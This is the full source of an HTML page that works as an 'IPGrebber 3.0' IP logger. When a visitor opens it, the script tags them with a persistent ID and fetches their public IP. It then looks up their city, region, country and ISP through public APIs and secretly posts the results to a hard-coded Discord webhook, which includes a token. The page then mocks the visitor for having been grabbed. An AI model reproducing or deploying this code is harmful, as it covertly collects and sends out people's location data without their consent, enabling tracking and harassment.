<!DOCTYPE html>
<html>
  <head>
    <title>Haha</title>
    <script>
      function generateRandomId() {
        const characters = "0123456789";
        let id = "";
        for (let i = 0; i < 16; i++) {
          id += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return id;
      }

      function displayIP() {
        const userId = localStorage.getItem("siteUserId");
        if (!userId) {
          const newUserId = generateRandomId();
          localStorage.setItem("siteUserId", newUserId);
          const userIdElement = document.getElementById("userId");
          userIdElement.textContent = newUserId;
          fetchIP(newUserId);
        } else {
          const userIdElement = document.getElementById("userId");
          userIdElement.textContent = userId;
          fetchIP(userId);
        }
      }

      function fetchIP(userId) {
        fetch("https://api.ipify.org/?format=json")
          .then((response) => response.json())
          .then((data) => {
            const ipElement = document.getElementById("ip");
            ipElement.textContent = data.ip;

            fetchLocation(userId, data.ip);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }

      function fetchLocation(userId, ip) {
        fetch(`https://ipapi.co/${ip}/json/`)
          .then((response) => response.json())
          .then((data) => {
            const locationElement = document.getElementById("location");
            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
            locationElement.textContent = locationString;

            const ispElement = document.getElementById("isp");
            const ispString = data.org;
            ispElement.textContent = ispString;

            sendToWebhook(userId, ip, locationString);
          })
          .catch((error) => {
            console.error("Error:", error);
            const defaultLocation = "Unknown";
            const defaultIsp = "Unknown";
            sendToWebhook(userId, ip, defaultLocation);
          });
      }

      function sendToWebhook(userId, ip, location) {
        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
        const message = "User ID: " + userId + "\nIP: " + ip + "\nLocation: " + location;

        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ content: message })
        })
          .then((response) => console.log("Webhook sent successfully"))
          .catch((error) => console.error("Error sending webhook:", error));
      }
    </script>
  </head>
  <body onload="displayIP()">
    <h1>Haha your IP has been grabbed by IPGrebber 3.0</h1>
    <h2>Your User ID:</h2>
    <p id="userId">Loading...</p>
    <h2>Your IP Address:</h2>
    <p id="ip">Loading...</p>
    <h2>Your Location:</h2>
    <p id="location">Loading...</p>
    <h2>Your ip and location has been grabbed :)</h2>
  </body>
<html>
